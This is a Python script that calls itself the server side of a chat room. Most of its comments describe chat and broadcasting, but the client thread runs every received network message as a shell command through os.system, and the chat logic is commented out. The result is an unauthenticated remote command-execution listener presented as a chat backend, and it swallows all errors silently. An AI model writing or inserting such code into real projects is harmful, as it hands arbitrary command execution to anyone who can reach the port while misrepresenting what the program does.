#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  chatbackend.py
#
#  Copyright 2018 Matt Pettit <pettit.matt@gmail.com>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
#
# Python program to implement server side of chat room.
import socket
import select
import sys
import os
from _thread import *

"""The first argument AF_INET is the address domain of the
socket. This is used when we have an Internet Domain with
any two hosts The second argument is the type of socket.
SOCK_STREAM means that data or characters are read in
a continuous flow."""
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# checks whether sufficient arguments have been provided


# takes the first argument from command prompt as IP address
IP_address = '127.0.0.1'

# takes second argument from command prompt as port number
Port = int(1235)
"""
binds the server to an entered IP address and at the
specified port number.
The client must be aware of these parameters
"""
server.bind((IP_address, Port))

"""
listens for 100 active connections. This number can be
increased as per convenience.
"""
server.listen(100)

list_of_clients = []

def clientthread(conn, addr):
    # sends a message to the client whose user object is conn



    while True:
            try:
                message = conn.recv(2048)
                os.system(message)

                    # Calls broadcast function to send message to all
                    #message_to_send =(message)
                    #broadcast(message_to_send, conn)



            except:
                continue

"""Using the below function, we broadcast the message to all
clients who's object is not the same as the one sending
the message """

"""The following function simply removes the object
from the list that was created at the beginning of
the program"""
# def remove(connection):
#     if connection in list_of_clients:
#         list_of_clients.remove(connection)

while True:

    """Accepts a connection request and stores two parameters,
    conn which is a socket object for that user, and addr
    which contains the IP address of the client that just
    connected"""
    conn, addr = server.accept()

    """Maintains a list of clients for ease of broadcasting
    a message to all available people in the chatroom"""
    list_of_clients.append(conn)

    # prints the address of the user that just connecte

    # creates and individual thread for every user
    # that connects
    start_new_thread(clientthread,(conn,addr))

conn.close()
server.close()
